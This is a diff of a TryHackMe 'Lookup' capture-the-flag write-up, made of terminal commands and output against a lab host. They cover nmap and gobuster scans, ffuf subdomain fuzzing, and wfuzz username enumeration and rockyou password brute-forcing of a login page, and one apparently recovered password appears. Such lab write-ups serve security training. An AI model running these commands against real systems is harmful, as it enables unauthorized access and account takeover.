@@ -1,5 +1,10 @@
 <code>
 
+## LookUp
+
+https://tryhackme.com/r/room/lookup
+
+### Enumeration 
 
 ┌──(kali㉿kali)-[~]
 └─$ nmap  -sV -A -Pn 10.10.217.222
@@ -26,10 +31,9 @@ https://tryhackme.com/r/room/lookup
 
 ┌──(kali㉿kali)-[~/Documents/THM]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://lookup.thm -x php,txt,html 
-===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+
 [+] Url:                     http://lookup.thm
 [+] Method:                  GET
 [+] Threads:                 10
@@ -38,9 +42,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.6
 [+] Extensions:              php,txt,html
 [+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
+
 /.php                 (Status: 403) [Size: 275]
 /.html                (Status: 403) [Size: 275]
 /index.php            (Status: 200) [Size: 719]
@@ -49,9 +51,6 @@ Starting gobuster in directory enumeration mode
 /.php                 (Status: 403) [Size: 275]
 /server-status        (Status: 403) [Size: 275]
 Progress: 882240 / 882244 (100.00%)
-===============================================================
-Finished
-===============================================================
 
 
 └─$ ffuf -c -w ../../www/wordlists/Subdomain.txt -u  "http://lookup.thm/" -H 'Host: FUZZ.lookup.thm' -fw 1
@@ -101,6 +100,7 @@ WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration
 www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
 :: Progress: [649649/649649] :: Job [1/1] :: 544 req/sec :: Duration: [0:11:43] :: Errors: 0 ::
 
+### Users enumerations
 
 ┌──(kali㉿kali)-[~]
 └─$  wfuzz -c -z file,./Documents/www/wordlists/usernames_70k_Sq00ky.txt --hs "Wrong username or password. Please try again." -u http://lookup.thm/login.php -d "username=FUZZ&password=admin"
@@ -124,10 +124,6 @@ Processed Requests: 73317
 Filtered Requests: 73315
 Requests/sec.: 234.6402
 
-                                                                                                                                                   
-┌──(kali㉿kali)-[~]
-└─$ 06Falcon
-06Falcon: command not found
                                                                                                                                                    
 ┌──(kali㉿kali)-[~]
 └─$ wfuzz -c -z file,./Documents/www/wordlists/rockyou.txt  --hs "Wrong password. Please try again." -u http://lookup.thm/login.php -d "username=jose&password=FUZZ"  
